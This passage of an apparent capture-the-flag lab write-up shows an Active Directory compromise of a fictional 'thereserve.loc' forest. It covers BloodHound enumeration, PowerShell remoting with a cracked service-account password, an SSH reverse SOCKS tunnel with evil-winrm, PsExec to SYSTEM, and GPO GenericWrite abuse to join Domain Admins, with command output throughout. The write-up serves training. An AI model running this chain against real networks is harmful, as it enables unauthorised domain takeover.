</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">08.6588099</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Status:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">0</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="n">/s</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">53</span><span class="w"> </span><span class="nx">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">25.4557589</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="p">[</span><span class="n">CommonLib</span><span class="w"> </span><span class="n">LDAPUtils</span><span class="p">]</span><span class="n">Found</span><span class="w"> </span><span class="nx">usable</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">thereserve.loc</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">ROOTDC.thereserve.loc</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">25.4557589</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="p">[</span><span class="n">CommonLib</span><span class="w"> </span><span class="n">LDAPUtils</span><span class="p">]</span><span class="n">Found</span><span class="w"> </span><span class="nx">usable</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">thereserve.loc</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">ROOTDC.thereserve.loc</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">28.2861838</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Consumers</span><span class="w"> </span><span class="nx">finished</span><span class="p">,</span><span class="w"> </span><span class="nx">closing</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="nx">channel</span><span class="w">
</span><span class="n">Closing</span><span class="w"> </span><span class="nx">writers</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">28.3814768</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Output</span><span class="w"> </span><span class="nx">channel</span><span class="w"> </span><span class="nx">closed</span><span class="p">,</span><span class="w"> </span><span class="nx">waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="nx">task</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">complete</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">28.5361835</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Status:</span><span class="w"> </span><span class="nx">1005</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">1005</span><span class="w"> </span><span class="mf">20.1</span><span class="p">)</span><span class="n">/s</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">59</span><span class="w"> </span><span class="nx">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">28.5361835</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Enumeration</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">00:00:50.0935515</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">29.0711816</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Saving</span><span class="w"> </span><span class="nx">cache</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">stats:</span><span class="w"> </span><span class="nx">970</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">976</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">SID</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">2</span><span class="w"> </span><span class="n">machine</span><span class="w"> </span><span class="nx">sid</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">5</span><span class="w"> </span><span class="n">sid</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">1</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="nx">catalog</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mf">29.1181271</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">SharpHound</span><span class="w"> </span><span class="nx">Enumeration</span><span class="w"> </span><span class="nx">Completed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">7:14</span><span class="w"> </span><span class="nx">PM</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">6/27/2024</span><span class="o">!</span><span class="w"> </span><span class="nx">Happy</span><span class="w"> </span><span class="nx">Graphing</span><span class="o">!</span><span class="w">
</span></pre></table></code></div></div><p>As we have recently compromised the SvcScanning user via a kerberoasting attack, let’s choose the option <strong><em>Shortest Path From kerberoastable Users.</em></strong> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/70923f00-e58f-4f92-9811-13f64d4f776b.png" alt="Untitled" /></p><p>GREAAAT! It seems that the svcScanning user is a member of the <code class="language-plaintext highlighter-rouge">services@corp.thereserve.loc</code> and has the permission to execute remote PowerShell commands on the <code class="language-plaintext highlighter-rouge">server2.corp.thereserve.loc</code> computer.</p><h3 id="gainning-foothold"><strong>Gainning Foothold</strong></h3><p><strong>From SERVER2 Machine</strong></p><p><strong>PowerShell Remote</strong> As per bloodhound output, let’s take advanage of our svcScanning user to execute remote commands on the Server2 machine:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Secpass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password1!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'corp.thereserve.loc\svcScanning'</span><span class="p">,</span><span class="w"> </span><span class="nv">$Secpass</span><span class="p">)</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w">  </span><span class="nx">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">server2.corp.thereserve.loc</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w">
</span><span class="n">corp\svcscanning</span><span class="w">
</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w">  </span><span class="nx">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">server2.corp.thereserve.loc</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">hostname</span><span class="p">}</span><span class="w">
</span><span class="n">SERVER2</span><span class="w">

</span><span class="c"># Getting a fully Interactive powershell session</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">server2.corp.thereserve.loc</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-SessionOption</span><span class="w"> </span><span class="p">(</span><span class="n">New-PSSessionOption</span><span class="w"> </span><span class="nt">-ProxyAccessType</span><span class="w"> </span><span class="nx">NoProxyServer</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">server2.corp.thereserve.loc</span><span class="p">]:</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\svcScanning\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="n">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w">
</span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">C</span><span class="p">)</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\svcScanning\Documents</span><span class="err">&gt;</span><span class="w">
</span><span class="p">[</span><span class="n">server2.corp.thereserve.loc</span><span class="p">]:</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\svcScanning\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="p">;</span><span class="n">hostname</span><span class="w">
</span><span class="nx">corp\svcscanning</span><span class="w">
</span><span class="n">SERVER2</span><span class="w">
</span></pre></table></code></div></div><p>Now we have access to a <code class="language-plaintext highlighter-rouge">server2.corp.thereserve.loc</code> computer. But unfortunately, we don’t have direct access from our attacker machine to SERVER1 or SERVER2. So we need to establish port forwarding to ease the process of exploitation and privilege escalation.</p><h3 id="dynamic-port-forwarding"><strong>Dynamic Port Forwarding</strong></h3><p>As we have ssh enabled on WRK1 and WRK2 machines, let’s create a secure tunnel via SSH using the dynamic port forwarding method.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># On WRK1 Machine</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ssh</span><span class="w"> </span><span class="nx">tunneluser</span><span class="err">@</span><span class="nx">12.100.1.x</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">9050</span><span class="w"> </span><span class="nt">-N</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">authenticity</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="s1">'12.100.1.x (12.100.1.x)'</span><span class="w"> </span><span class="nx">can</span><span class="s1">'t be established.
ECDSA key fingerprint is SHA256:vy8coHY0geP5OZvyw+zTPNkk9edAkZVP6DZxa7hSuls.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '</span><span class="nx">12.100.1.x</span><span class="s1">' (ECDSA) to the list of known hosts.
tunneluser@12.100.1.x'</span><span class="nx">s</span><span class="w"> </span><span class="nx">password:</span><span class="w">
</span></pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c"># On My Attacking Machine</span>
<span class="nv">$ </span>netstat <span class="nt">-lno</span> | <span class="nb">head</span> <span class="nt">-n</span> 10               
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:9050          0.0.0.0:<span class="k">*</span>               LISTEN      off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 ::1:9050                :::<span class="k">*</span>                    LISTEN      off <span class="o">(</span>0.00/0/0<span class="o">)</span>

<span class="nv">$ </span>proxychains <span class="nt">-q</span> evil-winrm <span class="nt">-i</span>  10.200.x.32 <span class="nt">-u</span> svcScanning <span class="nt">-p</span> <span class="s1">'Password1!'</span>

Evil-WinRM shell v3.4
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vcScanning<span class="se">\D</span>ocuments&gt; <span class="nb">hostname
</span>SERVER2
</pre></table></code></div></div><p>We are now able to obtain the following flags:</p><ul><li><p><strong><em>Flag 5, Foothold on Corporate Division Tier 1 Infrastructure</em></strong></p><li><p><strong><em>Flag 6, Administrative access to Corporate Division Tier 1 Infrastructure</em></strong></p></ul><h2 id="full-compromise-of-corp-domain"><strong>Full Compromise of CORP Domain</strong></h2><h3 id="exploiting-gpo-genericwrite"><strong>Exploiting GPO GenericWrite</strong></h3><p><strong>FROM SERVER2 Machine</strong></p><p>Since we got access to SERVER1 and SERVER2, let’s execute the attack vector that was suggested by Bloodhound. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/70923f00-e58f-4f92-9811-13f64d4f776b.png" alt="Untitled" /></p><p>As <code class="language-plaintext highlighter-rouge">SvcScanning</code>user has GenericWrite permission over the DC Backups group policy which is linked with the Domain Controllers group and the CORPDC Machine. Meaning, if we were able to exploit it, we will get access to the DC machine. Let’s first open MMC and add the group policy management snap in. then choose the DC Backup Policy and edit. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2015.png" alt="Untitled" /></p><p>Hmm! Unfortunately, I wasn’t able to edit the policy and wasn’t sure why; it took me lots of time to figure it out. It appears that I need to run MMC with a Local System account privilege, but I was running it with an administrator account. To do that, we could use <code class="language-plaintext highlighter-rouge">psexec64.exe</code> to run a cmd as a system account, then open the MMC.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cp</span><span class="w"> </span><span class="nx">\\tsclient\share\psexec64.exe</span><span class="w"> </span><span class="o">.</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="w">

</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">4</span><span class="n">/11/2023</span><span class="w">   </span><span class="nx">4:10</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">833472</span><span class="w"> </span><span class="nx">psexec64.exe</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\psexec64.exe</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">

</span><span class="n">PsExec</span><span class="w"> </span><span class="nx">v2.43</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Execute</span><span class="w"> </span><span class="nx">processes</span><span class="w"> </span><span class="nx">remotely</span><span class="w">
</span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">C</span><span class="p">)</span><span class="w"> </span><span class="nx">2001-2023</span><span class="w"> </span><span class="nx">Mark</span><span class="w"> </span><span class="nx">Russinovich</span><span class="w">
</span><span class="n">Sysinternals</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">www.sysinternals.com</span><span class="w">

</span><span class="n">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="n">nt</span><span class="w"> </span><span class="nx">authority\system</span><span class="w">

</span><span class="n">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">mmc</span><span class="w">
</span></pre></table></code></div></div><p>Editing the policy and adding our svcScanning user to the Domain Admins and Domain Controllers group via the Restricted Groups policy. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2016.png" alt="Untitled" /></p><p>Updating the GPO and checking our privileges.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\svcScanning</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">gpupdate.exe</span><span class="w"> </span><span class="nx">/force</span><span class="w">
</span><span class="n">Updating</span><span class="w"> </span><span class="nx">policy...</span><span class="w">

</span><span class="n">Computer</span><span class="w"> </span><span class="nx">Policy</span><span class="w"> </span><span class="nx">update</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Policy</span><span class="w"> </span><span class="nx">update</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\svcScanning</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">svcScanning</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">processed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">corp.thereserve.loc.</span><span class="w">

</span><span class="n">User</span><span class="w"> </span><span class="nx">name</span><span class="w">                    </span><span class="nx">svcScanning</span><span class="w">
</span><span class="n">Full</span><span class="w"> </span><span class="nx">Name</span><span class="w">                    </span><span class="nx">svcScanning</span><span class="w">
</span><span class="n">Comment</span><span class="w">
</span><span class="nx">Local</span><span class="w"> </span><span class="nx">Group</span><span class="w"> </span><span class="nx">Memberships</span><span class="w">
</span><span class="n">Global</span><span class="w"> </span><span class="nx">Group</span><span class="w"> </span><span class="nx">memberships</span><span class="w">     </span><span class="o">*</span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controllers</span><span class="w">   </span><span class="o">*</span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Users</span><span class="w">
                             </span><span class="o">*</span><span class="n">Services</span><span class="w">             </span><span class="o">*</span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p>Woo! Now we can RDP to the DC machine, and we are now Domain Admins and OWN the whole Domain. We are now able to obtain the following flag:</p><p><strong><em>- Flag-7: Foothold on Corporate Division Tier 0 Infrastructure</em></strong></p><p><strong><em>- Flag-8: Administrative access to Corporate Division Tier 0 Infrastructure</em></strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/d9ab914b-c1ac-4de2-a2f7-8efa8b2c5ede.png" alt="Untitled" /></p><h2 id="full-compromise-of-rootdc"><strong>Full Compromise of ROOTDC</strong></h2><h3 id="enumeration-2"><strong>Enumeration</strong></h3><p><strong>From CORPDC Machine</strong></p><p>Now we are part of the domain admins group and we own a child domain inside the whole forest. So let’s enumerate some information about the forest and the domain trust.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="c"># Forest: thereserve.loc</span><span class="w">
</span><span class="c"># ChildDomain1: bank.thereserve.loc</span><span class="w">
</span><span class="c"># ChildDomain2: corp.thereserve.loc -- OWNED</span><span class="w">

</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADForest</span><span class="w">
</span><span class="n">ApplicationPartitions</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">DC</span><span class="o">=</span><span class="n">ForestDnsZones</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">,</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">DomainDnsZones</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">,</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">DomainDnsZones</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">,</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">DomainDnsZones</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">bank</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">}</span><span class="w">
</span><span class="n">CrossForestReferences</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="n">DomainNamingMaster</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">ROOTDC.thereserve.loc</span><span class="w">
</span><span class="n">Domains</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">bank.thereserve.loc</span><span class="p">,</span><span class="w"> </span><span class="nx">corp.thereserve.loc</span><span class="p">,</span><span class="w"> </span><span class="nx">thereserve.loc</span><span class="p">}</span><span class="w">
</span><span class="n">ForestMode</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">Windows2012R2Forest</span><span class="w">
</span><span class="n">GlobalCatalogs</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">ROOTDC.thereserve.loc</span><span class="p">,</span><span class="w"> </span><span class="nx">BANKDC.bank.thereserve.loc</span><span class="p">,</span><span class="w"> </span><span class="nx">CORPDC.corp.thereserve.loc</span><span class="p">}</span><span class="w">
</span><span class="n">Name</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">thereserve.loc</span><span class="w">
</span><span class="n">PartitionsContainer</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Partitions</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">RootDomain</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">thereserve.loc</span><span class="w">
</span><span class="n">SchemaMaster</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">ROOTDC.thereserve.loc</span><span class="w">
</span><span class="n">Sites</span><span class="w">                 </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">Default-First-Site-Name</span><span class="p">}</span><span class="w">
</span><span class="n">SPNSuffixes</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="n">UPNSuffixes</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">

</span><span class="c"># Using PowerView</span><span class="w">
</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-NetDomainTrust</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">corp.thereserve.loc</span><span class="w">
</span><span class="n">SourceName</span><span class="w">          </span><span class="nx">TargetName</span><span class="w">       </span><span class="nx">TrustType</span><span class="w"> </span><span class="nx">TrustDirection</span><span class="w">
</span><span class="o">----------</span><span class="w">          </span><span class="o">----------</span><span class="w">       </span><span class="o">---------</span><span class="w"> </span><span class="o">--------------</span><span class="w">
</span><span class="n">corp.thereserve.loc</span><span class="w"> </span><span class="nx">thereserve.loc</span><span class="w"> </span><span class="nx">ParentChild</span><span class="w">  </span><span class="nx">Bidirectional</span><span class="w">

</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-NetDomainTrust</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">bank.thereserve.loc</span><span class="w">
</span><span class="n">SourceName</span><span class="w">          </span><span class="nx">TargetName</span><span class="w">       </span><span class="nx">TrustType</span><span class="w"> </span><span class="nx">TrustDirection</span><span class="w">
</span><span class="o">----------</span><span class="w">          </span><span class="o">----------</span><span class="w">       </span><span class="o">---------</span><span class="w"> </span><span class="o">--------------</span><span class="w">
</span><span class="n">bank.thereserve.loc</span><span class="w"> </span><span class="nx">thereserve.loc</span><span class="w"> </span><span class="nx">ParentChild</span><span class="w">  </span><span class="nx">Bidirectional</span><span class="w">
